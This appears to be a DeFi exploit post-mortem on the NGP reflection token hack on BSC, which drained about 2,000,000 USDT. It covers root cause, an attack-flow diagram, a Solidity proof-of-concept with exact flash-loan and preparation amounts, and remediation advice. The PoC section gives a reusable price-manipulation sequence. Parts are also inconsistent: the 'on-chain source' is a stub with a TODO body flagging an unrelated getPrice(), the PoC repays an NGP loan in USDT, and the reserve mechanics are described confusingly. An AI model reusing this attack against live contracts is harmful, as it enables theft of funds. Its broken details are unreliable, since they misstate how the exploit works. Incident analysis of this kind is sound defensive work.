# NGP — Reflection Token Mechanism Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-09-24 |
| **Protocol** | NGP Token |
| **Chain** | BSC |
| **Loss** | ~2,000,000 USDT |
| **Attacker** | [0x0305ddd42887676ec593b39ace691b772eb3c876](https://bscscan.com/address/0x0305ddd42887676ec593b39ace691b772eb3c876) |
| **Attack Tx** | [0xc2066e0d...](https://bscscan.com/tx/0xc2066e0dff1a8a042057387d7356ad7ced76ab90904baa1e0b5ecbc2434df8e1) |
| **Vulnerable Contract** | [0xd2f26200cd524db097cf4ab7cc2e5c38ab6ae5c9](https://bscscan.com/address/0xd2f26200cd524db097cf4ab7cc2e5c38ab6ae5c9) |
| **Root Cause** | Manipulation of `sync()` trigger conditions inside NGP token's `_update()`, drastically distorting pair price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-09/NGP_exp.sol) |

---

## 1. Vulnerability Overview

The NGP token implements an automatic reflection mechanism on transfer. Within the `_update()` function, when certain conditions are met, it calls `sync()` on the PancakeSwap pair to update the reserves. The attacker leveraged two pre-calculated magic values (`FLASHLOAN_AMOUNT`, `PREPARATION_NGP_AMOUNT`) to satisfy the sync trigger conditions, drastically reducing the pair's NGP reserve and draining ~$2,000,000 in USDT.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: sync() trigger condition inside _update() is manipulable
function _update(address from, address to, uint256 amount) internal override {
    // Calls pair.sync() under specific conditions
    // These conditions can be triggered by specific balance values
    if (shouldSync(from, to, amount)) {
        IPancakePair(pair).sync(); // ← Force-updates reserves to current balance
    }
    super._update(from, to, amount);
}

// sync() updates reserves based on current token balance
// If the attacker manipulates the pair's NGP balance, reserves become distorted

// ✅ Recommended fix: design sync trigger conditions carefully
// sync() must not be triggered by externally manipulable conditions
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: NGP_decompiled.sol
contract NGP {
    function getPrice() external view returns (uint256) {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Flash loan 211,000,000 NGP (mockFlashloanProvider)
  │
  ├─[2]─▶ Transfer 1,350,000 NGP to deadAddress (preparation)
  │         └─ Sets up sync() trigger condition inside _update()
  │
  ├─[3]─▶ Transfer large amount of flash-loaned NGP directly to pair
  │         └─ _update() calls pair.sync()
  │             → Pair's NGP reserve drastically reduced (ratio distorted)
  │
  ├─[4]─▶ Swap NGP → USDT using distorted reserves
  │         └─ Receive large amount of USDT at extremely favorable ratio
  │
  └─[5]─▶ Repay flash loan + retain ~2,000,000 USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Pre-calculated magic values:
// (1) Flash loan amount required to trigger sync()
uint256 public FLASHLOAN_AMOUNT = 211_000_000 * 10 ** 18;
// (2) Preparation amount to maximally reduce pair's NGP balance
uint256 public PREPARATION_NGP_AMOUNT = 1_350_000 * 10 ** 18;

function flashloanCallback() public {
    // [1] Preparation: transfer NGP to deadAddress
    // → Satisfy sync trigger condition inside _update()
    ngpToken.transfer(deadAddress, PREPARATION_NGP_AMOUNT);

    // [2] Transfer large amount of NGP directly to pair
    // → Triggers _update() → triggers pair.sync()
    // → Pair NGP reserve updated to current (now low) balance
    ngpToken.transfer(pair, FLASHLOAN_AMOUNT - PREPARATION_NGP_AMOUNT);

    // [3] Swap NGP → USDT against distorted reserve state
    // → In k = x * y formula, x (NGP reserve) is small,
    //   so small NGP input yields large USDT output
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        ngpBalance, 0, path, address(this), block.timestamp
    );

    // [4] Repay flash loan
    usdt.transfer(address(mockFlashloanProvider), FLASHLOAN_AMOUNT);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reflection token mechanism manipulation |
| **Attack Vector** | Flash loan + forced sync() trigger |
| **Impact** | AMM pair reserve distortion → large-scale fund drain |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP Classification** | Price Manipulation / Token Economics |

## 6. Remediation Recommendations

1. **Harden sync() trigger conditions**: Design the system so that externally manipulable balance values cannot trigger sync().
2. **Audit reflection mechanism**: Thoroughly review any logic inside transfer hooks that modifies pair state.
3. **Limit large transfers**: Cap the maximum amount that can be moved in a single transfer.
4. **Verify economic invariants**: Mathematically verify economic invariants when combining reflection tokens with AMM pairs.

## 7. Lessons Learned

- Designs that directly modify AMM pair state from within a reflection token's transfer hook are extremely dangerous.
- Attacks based on magic value computation (off-chain pre-calculation) may appear simple but can produce catastrophic results.
- The $2 million loss originated not from a complex vulnerability, but from a straightforward flaw in economic mechanism design.